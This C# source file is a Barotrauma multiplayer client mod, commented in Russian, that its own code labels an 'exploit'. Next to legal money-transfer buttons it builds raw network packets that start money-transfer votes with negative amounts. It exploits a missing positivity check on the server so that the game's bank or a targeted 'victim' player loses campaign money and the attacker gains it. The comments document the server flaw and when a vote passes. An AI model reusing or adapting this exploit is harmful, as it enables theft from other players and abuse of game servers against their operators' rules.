using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  MONEY MOVER (волны 455/521)
    //  Два пути движения денег кампании:
    //
    //  ПУТЬ 1 — легальный TRANSFER_MONEY (зеркало TabMenu.SendTransaction):
    //    NetWalletTransfer{Sender, Receiver, Amount}.Write(msg) с хедером
    //    TRANSFER_MONEY. Sender НЕ указываем (= я по гейту server:1195:
    //    id != sender.CharacterID требует AllowedToManageWallets).
    //    Receiver = игрок или ПУСТО = БАНК.
    //
    //  ПУТЬ 2 — Vote TransferMoney (Voting.cs:313, звезда 455):
    //    int amount = ReadInt32() БЕЗ <=0-чека (в ServerReadMoney он ЕСТЬ —
    //    несимметрично!). amount<0 → TransferVote.Finish:
    //    fromWallet.TryDeduct(-X): CanAfford = Balance >= -X — ВСЕГДА true
    //    (любой баланс больше отрицательного) → Deduct(-X) = ПЛЮС X
    //    отправителю; toWallet.Give(-X) = МИНУС X получателю.
    //    from = null (байт 0xFF не матчится ни одному SessionId → Find=null)
    //    = БАНК-донор. Соло на сервере голосование проходит мгновенно
    //    (Update: inGameClients==1 → passed), на людном — VoteRequiredRatio
    //    0.6 да-голосов после таймаута 30с.
    //  Характер: голосование видно ВСЕМ — только на своём сервере.
    // ============================================================
    public class MoneyTransferModule : CSModuleBase
    {
        public override string Id   => "money_mover";
        public override string Name => "Money Mover";
        public override string Description =>
            "Движение денег кампании.\n\n" +
            "• PAY BANK / PAY PLAYER — легальный перевод (TRANSFER_MONEY)\n" +
            "• NEGATIVE VOTE PUMP — голосование с amount<0 (455):\n" +
            "  TryDeduct(-X) всегда проходит → тебе +X, цели -X навсегда\n" +
            "  (вариант из БАНКА: банк платит, тебе +X)\n" +
            "• Соло на сервере: голосование проходит мгновенно\n" +
            "• На людном сервере нужны yes-голоса (ratio 0.6)";
        public override string Category => "exploit";

        private static GUIMessageBox _box;
        private static GUITextBox _amount;
        private static GUITextBlock _status;

        public override string GetLabel() => "Money Mover 💸";

        public override void OnClick()
        {
            if (_box != null) { _box.Close(); _box = null; return; }
            Open();
        }

        private static void Open()
        {
            if (GameMain.Client == null || !(GameMain.GameSession?.Campaign is MultiPlayerCampaign))
            {
                GUI.AddMessage("[MoneyMover] Нужен мультиплеер + кампания", Color.Orange);
                return;
            }

            _box = new GUIMessageBox(
                headerText: "MONEY MOVER",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.62f, 0.62f));

            var content = _box.Content;
            content.ClearChildren();

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.12f), content.RectTransform),
                StatusText(), textAlignment: Alignment.CenterLeft, wrap: true,
                font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);

            var amountRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.1f), content.RectTransform),
                isHorizontal: true);
            amountRow.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.2f, 1f), amountRow.RectTransform),
                "Сумма:", textAlignment: Alignment.CenterRight);
            _amount = new GUITextBox(
                new RectTransform(new Vector2(0.8f, 1f), amountRow.RectTransform),
                "1000");

            var buttons = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.74f), content.RectTransform),
                isHorizontal: false);
            buttons.RelativeSpacing = 0.012f;

            AddBtn(buttons, "PAY BANK (легально, свой кошелёк → банк)", new Color(60, 140, 80), () =>
            {
                int amount = GetAmount();
                if (amount <= 0) return "сумма должна быть > 0";
                SendTransfer(null, amount); // Sender=None(me), Receiver=None(банк)
                return "перевёл " + amount + " mk в банк";
            });

            AddBtn(buttons, "PAY PLAYER (легально, свой кошелёк → игрок)", new Color(60, 120, 140), () =>
            {
                int amount = GetAmount();
                if (amount <= 0) return "сумма должна быть > 0";
                Character target = FindOtherPlayer();
                if (target == null) return "нет второго живого игрока";
                SendTransfer(target.ID, amount);
                return "перевёл " + amount + " mk игроку " + target.Name;
            });

            AddBtn(buttons, "☠ VOTE PUMP: банк платит ТЕБЕ (from=null → to=me)", new Color(170, 60, 60), () =>
            {
                int amount = GetAmount();
                if (amount <= 0) return "сумма должна быть > 0";
                StartTransferVote(-amount, SessionNone, MeSession);
                return "vote из банка: тебе +" + amount + " (соло=мгновенно; на людях нужны yes 60%)";
            });

            AddBtn(buttons, "☠ VOTE PUMP: игрок платит ТЕБЕ (from=victim → to=me)", new Color(150, 55, 55), () =>
            {
                int amount = GetAmount();
                if (amount <= 0) return "сумма должна быть > 0";
                Character victim = FindOtherPlayer();
                if (victim == null) return "нужна жертва: второй живой игрок";
                byte victimSession = GetSessionOf(victim);
                if (victimSession == 0xFF) return "SessionId жертвы не найден";
                StartTransferVote(-amount, victimSession, MeSession);
                return "vote: жертва -" + amount + ", тебе +" + amount;
            });

            AddBtn(buttons, "☠ VOTE PUMP: банк платит ЖЕРТВЕ (троллинг банка)", new Color(120, 60, 120), () =>
            {
                int amount = GetAmount();
                if (amount <= 0) return "сумма должна быть > 0";
                Character victim = FindOtherPlayer();
                if (victim == null) return "нужна жертва";
                byte victimSession = GetSessionOf(victim);
                if (victimSession == 0xFF) return "SessionId жертвы не найден";
                StartTransferVote(-amount, SessionNone, victimSession);
                return "vote: банк -" + amount + ", жертве +" + amount;
            });
        }

        private static void AddBtn(GUILayoutGroup parent, string text, Color color, Func<string> action)
        {
            var btn = new GUIButton(
                new RectTransform(new Vector2(1f, 0.15f), parent.RectTransform), text);
            btn.Color = color;
            btn.OnClicked = (b, d) =>
            {
                try
                {
                    string result = action();
                    GUI.AddMessage("[MoneyMover] " + result, color);
                    if (_status != null) _status.Text = StatusText() + "\n→ " + result;
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[MoneyMover] " + e.Message, Color.Red);
                }
                return true;
            };
        }

        private static string StatusText()
        {
            try
            {
                if (GameMain.GameSession?.Campaign is MultiPlayerCampaign mpc)
                {
                    return "кошелёк: " + mpc.GetWallet().Balance + " mk | банк: " + mpc.Bank.Balance + " mk";
                }
            }
            catch { }
            return "кампания недоступна";
        }

        private static int GetAmount()
        {
            if (_amount == null) return 0;
            if (!int.TryParse((_amount.Text ?? "").Trim(), out int v)) return 0;
            return Math.Clamp(v, 1, 100000000);
        }

        // ---- акторы ----

        private static byte MeSession
        {
            get
            {
                var c = GameMain.Client;
                return c == null ? (byte)0xFF : c.SessionId;
            }
        }

        // 0xFF за пределами реальных SessionId (0..254) → ConnectedClients.Find
        // не найдёт → From/To = null → null-кошелёк = БАНК
        private const byte SessionNone = 0xFF;

        private static Character FindOtherPlayer()
        {
            Character me = Character.Controlled;
            if (me == null) return null;
            foreach (Character c in Character.CharacterList)
            {
                if (c == null || c.Removed || c == me) continue;
                if (c.IsRemotePlayer) return c;
            }
            return null;
        }

        // ConnectedClients публичен (NetworkMember.cs:216) — SessionId жертвы
        // берём прямо из списка по её персонажу.
        private static byte GetSessionOf(Character character)
        {
            try
            {
                var clients = GameMain.Client?.ConnectedClients;
                if (clients == null) return 0xFF;
                foreach (Client c in clients)
                {
                    if (c != null && c.Character == character) return c.SessionId;
                }
            }
            catch { }
            return 0xFF;
        }

        // ---- ПУТЬ 1: прямой TRANSFER_MONEY ----
        // Формат INetSerializableStruct.Write (INetSerializableStruct.cs:796):
        //   [WriteOnlyBitField (Option-флаги)] → WriteToMessage(msg) → [тело байтами]
        // Sender=None (гейт server:1195: чужой Sender требует AllowedToManageWallets).
        private static void SendTransfer(ushort? receiverCharId, int amount)
        {
            IWriteMessage body = new WriteOnlyMessage();
            // Receiver: Option<ushort>
            if (receiverCharId.HasValue) { body.WriteUInt16(receiverCharId.Value); }
            // Amount: int (сервер: if (transfer.Amount <= 0) return)
            body.WriteInt32(amount);

            IWriteMessage msg = new WriteOnlyMessage().WithHeader(ClientPacketHeader.TRANSFER_MONEY);
            var bf = new SimpleBitWriter();
            bf.WriteBoolean(false);                              // Sender = None
            bf.WriteBoolean(receiverCharId.HasValue);            // Receiver = Some/None
            bf.FlushTo(msg);                                     // битфилд ПЕРЕД телом
            msg.WriteBytes(body.Buffer, 0, body.LengthBytes);

            GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
        }

        // обёртка для GUI (легальные переводы)
        private static void SendTransfer(object receiverId, object _unused, int amount)
        {
            SendTransfer(receiverId as ushort?, amount);
        }

        // ---- ПУТЬ 2: Vote TransferMoney ----

        private static void StartTransferVote(int amount, byte fromSession, byte toSession)
        {
            // Зеркало Voting.ClientWrite(VoteType.TransferMoney, int money):
            //   bool false (не голос «за», а СТАРТ голосования)
            //   int amount
            //   byte fromSession
            //   byte toSession
            //   WritePadBits()
            // Обёрнуто в UPDATE_LOBBY + сегмент Vote (GameClient.Vote).
            IWriteMessage msg = new WriteOnlyMessage();
            msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
            {
                segmentTable.StartNewSegment(ClientNetSegment.Vote);
                msg.WriteByte((byte)VoteType.TransferMoney);
                msg.WriteBoolean(true);             // startVote = TRUE (ветка старта Voting.cs:313)
                msg.WriteInt32(amount);
                msg.WriteByte(fromSession);
                msg.WriteByte(toSession);
                msg.WritePadBits();
            }
            GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
        }
    }

    // Option<ushort> в NetStruct-ах кодируется в ВНЕШНЕМ битфилде структуры:
    // bool hasValue + ushort payload. Пишем вручную.
    internal sealed class SimpleBitWriter
    {
        private readonly List<bool> _bits = new List<bool>();

        public void WriteBoolean(bool b) => _bits.Add(b);

        public void FlushTo(IWriteMessage msg)
        {
            byte current = 0;
            int bit = 0;
            foreach (bool b in _bits)
            {
                if (b) { current |= (byte)(1 << bit); }
                bit++;
                if (bit == 8) { msg.WriteByte(current); current = 0; bit = 0; }
            }
            if (bit > 0) { msg.WriteByte(current); }
        }
    }
}
